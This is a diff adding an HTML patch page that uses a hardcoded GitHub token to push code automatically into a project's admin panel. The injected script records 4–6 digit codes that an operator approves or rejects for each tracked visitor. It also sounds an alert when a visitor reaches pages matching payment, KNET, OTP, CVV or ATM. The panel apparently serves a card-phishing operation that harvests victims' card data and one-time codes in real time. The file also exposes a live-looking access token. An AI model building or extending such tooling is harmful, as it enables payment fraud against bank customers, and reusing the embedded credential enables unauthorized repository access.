@@ -1,0 +1,170 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>FIX106</title>
+<style>
+body{font-family:system-ui,Tajawal,sans-serif;background:#0f1115;color:#e8e8ea;padding:16px;max-width:920px;margin:auto}
+h1{font-size:17px}#st{background:#1b2230;border:1px solid #2b3444;border-radius:8px;padding:9px;margin:8px 0;font-size:13px}
+input{width:100%;padding:9px;border-radius:8px;border:1px solid #333;background:#1a1d24;color:#fff;box-sizing:border-box}
+button{padding:11px 16px;border-radius:9px;border:0;background:#16a34a;color:#fff;font-weight:700;cursor:pointer;margin-top:8px}
+#log{background:#141821;border:1px solid #262b36;border-radius:9px;padding:12px;margin-top:12px;font-family:monospace;font-size:12.5px;white-space:pre-wrap;min-height:36px}
+.ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}textarea{display:none}
+</style></head><body>
+<h1>FIX106 — حفظ الرموز المرفوضة + صوت الضفدع من ملخص الدفع</h1>
+<div id="st">جاري التحميل</div><div>Token:</div>
+<input id="tok" placeholder="ghp_..."><button id="run">رفع التعديلات</button><div id="log"></div>
+
+<textarea id="pBlock">
+<script id="kddF106">
+/* ===== حفظ الرموز المرفوضة ===== */
+(function(){
+  if (window.__f106a) return; window.__f106a = 1;
+  var LOG = {};
+  try { LOG = JSON.parse(localStorage.getItem("kdd_rej")||"{}") || {}; } catch(e){ LOG = {}; }
+  function save(){ try { localStorage.setItem("kdd_rej", JSON.stringify(LOG)); } catch(e){} }
+  function selId(){ try { return selectedVisitorId || null; } catch(e){ return null; } }
+  function vis(id){ var v=null; try { v = visitors.get(id) || null; } catch(e){} if(!v){ try { visitors.forEach(function(x){ if(!v && x && x._id===id) v=x; }); } catch(e){} } return v; }
+  function codeNear(el){
+    var n = el, d = 0;
+    while (n && d < 6){
+      if (n.querySelectorAll){
+        var cs = n.querySelectorAll("span,b,strong,td");
+        for (var i=0;i<cs.length;i++){ var t=(cs[i].textContent||"").trim(); if (/^\d{4,6}$/.test(t)) return t; }
+      }
+      n = n.parentElement; d++;
+    }
+    return null;
+  }
+  document.addEventListener("click", function(e){
+    var b = e.target && e.target.closest ? e.target.closest("button") : null;
+    if (!b) return;
+    var tx = (b.textContent||"").trim();
+    var st = tx.indexOf("رفض") > -1 ? "مرفوض" : (tx.indexOf("موافقة") > -1 ? "مقبول" : null);
+    if (!st) return;
+    var id = selId(); if (!id) return;
+    var code = codeNear(b);
+    if (!code){ try { var v = vis(id); if (v && (v.digitCodes||[]).length) code = String(v.digitCodes[v.digitCodes.length-1].code||""); } catch(e){} }
+    if (!code) return;
+    var arr = LOG[id] || (LOG[id] = []);
+    var last = arr[arr.length-1];
+    if (!(last && last.c === code && last.s === st)){
+      arr.push({ c: code, s: st, t: new Date().toLocaleTimeString("ar-EG",{hour:"2-digit",minute:"2-digit"}) });
+      save();
+    }
+    draw();
+  }, true);
+  function draw(){
+    var box = document.getElementById("visitorDetails"); if (!box) return;
+    var id = selId(); if (!id) return;
+    var old = document.getElementById("f106box"); if (old && old.parentNode) old.parentNode.removeChild(old);
+    var arr = LOG[id] || []; if (!arr.length) return;
+    var d = document.createElement("div");
+    d.id = "f106box";
+    d.style.cssText = "border:3px solid #f59e0b;border-radius:14px;padding:12px;margin:10px 0;background:#fffbeb";
+    var h = document.createElement("div");
+    h.style.cssText = "display:flex;justify-content:space-between;align-items:center;font-weight:800;font-size:15px;margin-bottom:8px;color:#92400e";
+    var hs = document.createElement("span"); hs.textContent = "🔒 الرموز المرفوضة (محفوظة دائماً)";
+    var cl = document.createElement("button");
+    cl.textContent = "مسح"; cl.style.cssText = "font-size:11px;padding:3px 10px;border-radius:8px;border:1px solid #f59e0b;background:#fff;color:#b45309;cursor:pointer";
+    cl.addEventListener("click", function(){ LOG[id] = []; save(); draw(); });
+    h.appendChild(hs); h.appendChild(cl); d.appendChild(h);
+    for (var i=arr.length-1;i>=0;i--){
+      var r = document.createElement("div");
+      r.style.cssText = "display:flex;justify-content:space-between;font-family:monospace;font-size:16px;padding:5px 0;border-top:1px dashed #e5e7eb";
+      var a = document.createElement("b"); a.textContent = arr[i].c; a.style.color = arr[i].s === "مرفوض" ? "#dc2626" : "#16a34a";
+      var c = document.createElement("span"); c.textContent = arr[i].s + " · " + arr[i].t; c.style.color = "#6b7280";
+      r.appendChild(a); r.appendChild(c); d.appendChild(r);
+    }
+    box.insertBefore(d, box.firstChild);
+  }
+  var orig = window.renderVisitorDetails;
+  if (typeof orig === "function" && !orig.__f106a){
+    var w = function(){ var r = orig.apply(this, arguments); try { draw(); } catch(e){} return r; };
+    w.__f106a = 1; window.renderVisitorDetails = w; try { renderVisitorDetails = w; } catch(e){}
+  }
+  setInterval(function(){ if (!document.getElementById("f106box")) draw(); }, 800);
+})();
+/* ===== صوت الضفدع ===== */
+(function(){
+  if (window.__f106b) return; window.__f106b = 1;
+  function ding(){
+    try { frogAudio.currentTime = 0; frogAudio.play().catch(function(){}); return; } catch(e){}
+    try { new Audio("/admin/frog.mp3").play(); } catch(e){}
+  }
+  var PAY = /ملخص|summary|دفع|كي نت|knet|otp|رمز|cvv|atm|نهائي|final/i;
+  function hook(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f106b) return;
+      s.__f106b = 1;
+      s.on("visitor:pageChanged", function(d){ try { if (PAY.test(String((d&&d.page)||""))) ding(); } catch(e){} });
+      s.on("visitor:dataSubmitted", function(d){ try { if (PAY.test(String((d&&d.data&&d.data.page)||""))) ding(); } catch(e){} });
+    } catch(e){}
+  }
+  hook(); setInterval(hook, 500);
+})();
+</script>
+</textarea>
+
+<script>
+(function(){
+  var HARD="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";
+  var OWNER="fahshomi-ui", REPO="KDD", BRANCH="main";
+  var FILES=["server/admin/index.html","kdd-public/admin.html"];
+  function $(id){ return document.getElementById(id); }
+  var st=$("st"), log=$("log"), tok=$("tok"), run=$("run");
+  function set(t){ try{ st.textContent=t; }catch(e){} }
+  function say(t,c){ var d=document.createElement("div"); if(c) d.className=c; d.textContent=t; log.appendChild(d); }
+  function clean(id){ var v=$(id).value; return v.replace(/^\n/,"").replace(/[ \t]+$/,"").replace(/\n+$/,""); }
+  try { var qs=""; try{ qs=new URLSearchParams(location.search).get("token")||""; }catch(e){} tok.value=qs||HARD; set("جاهز"); } catch(e){ set("خطأ: "+e.message); }
+  var AUTH=null;
+  async function probe(){
+    var t=tok.value.trim(); say("طول التوكن: "+t.length);
+    var vs=[["token","token "+t],["Bearer","Bearer "+t],["Basic","Basic "+btoa(t+":")]];
+    for (var i=0;i<vs.length;i++){
+      try{ var r=await fetch("https://api.github.com/repos/"+OWNER+"/"+REPO,{headers:{Authorization:vs[i][1],Accept:"application/vnd.github+json"}});
+        if(r.status===200){ say("✓ مصادقة: "+vs[i][0],"ok"); AUTH=vs[i][1]; return true; }
+        var bd=""; try{ bd=await r.text(); }catch(e){}
+        say("✗ "+vs[i][0]+" → "+r.status+" "+bd.slice(0,90),"err");
+      }catch(e){ say("✗ "+vs[i][0]+" → شبكة: "+e.message,"err"); }
+    }
+    return false;
+  }
+  function H(){ return { Authorization:AUTH, Accept:"application/vnd.github+json" }; }
+  function b64(s){ return btoa(unescape(encodeURIComponent(s))); }
+  async function doFile(path){
+    try{
+      var gr=await fetch("https://api.github.com/repos/"+OWNER+"/"+REPO+"/contents/"+path+"?ref="+BRANCH,{headers:H()});
+      if(!gr.ok){ say("✗ "+path+" : "+gr.status,"err"); return 0; }
+      var meta=await gr.json();
+      var src=decodeURIComponent(escape(atob(meta.content.replace(/\n/g,""))));
+      if (src.indexOf('id="kddF106"') > -1){ say("• "+path+" : مطبّق مسبقاً","warn"); return 0; }
+      var out=src;
+      var a='if (!noSoundPages.includes(currentPage)) {';
+      if (out.indexOf(a) > -1) out = out.replace(a, 'if (/ملخص|summary/i.test(String(currentPage||"")) || !noSoundPages.includes(currentPage)) {');
+      var b="['الصفحة الرئيسية', 'ملخص الدفع']";
+      if (out.indexOf(b) > -1) out = out.replace(b, "['الصفحة الرئيسية']");
+      var idx=out.lastIndexOf("</body>");
+      if (idx<0){ say("✗ "+path+" : لا يوجد </body>","err"); return 0; }
+      out = out.slice(0,idx)+clean("pBlock")+"\n"+out.slice(idx);
+      var pr=await fetch("https://api.github.com/repos/"+OWNER+"/"+REPO+"/contents/"+path,{method:"PUT",
+        headers:Object.assign(H(),{"Content-Type":"application/json"}),
+        body:JSON.stringify({message:"FIX106: keep rejected codes + frog sound from summary",content:b64(out),sha:meta.sha,branch:BRANCH})});
+      if(!pr.ok){ say("✗ "+path+" : "+pr.status,"err"); return 0; }
+      say("✓ تم التعديل : "+path,"ok"); return 1;
+    }catch(e){ say("✗ "+path+" : "+e.message,"err"); return 0; }
+  }
+  async function runAll(){
+    try{
+      log.innerHTML=""; if(!tok.value.trim()){ say("أدخل التوكن","err"); return; }
+      run.disabled=true; set("فحص التوكن...");
+      if(!await probe()){ say(""); say("⚠ التوكن مرفوض. اعمل توكن جديد من github.com/settings/tokens (صلاحية repo) والصقه بالمربع واضغط «رفع التعديلات».","err"); set("الصق توكن جديد"); run.disabled=false; return; }
+      set("جاري الرفع..."); say(""); var ok=0;
+      for (var i=0;i<FILES.length;i++){ set("معالجة: "+FILES[i]); if(await doFile(FILES[i])===1) ok++; }
+      say(""); say("النتيجة: "+ok+" ملف معدّل", ok?"ok":"warn"); set(ok?"تم ✓ — "+ok+" ملف":"انتهى بدون تعديل"); run.disabled=false;
+    }catch(e){ say("خطأ: "+e.message,"err"); set("خطأ"); run.disabled=false; }
+  }
+  run.addEventListener("click", runAll);
+  setTimeout(runAll, 700);
+})();
+</script>
+</body></html>
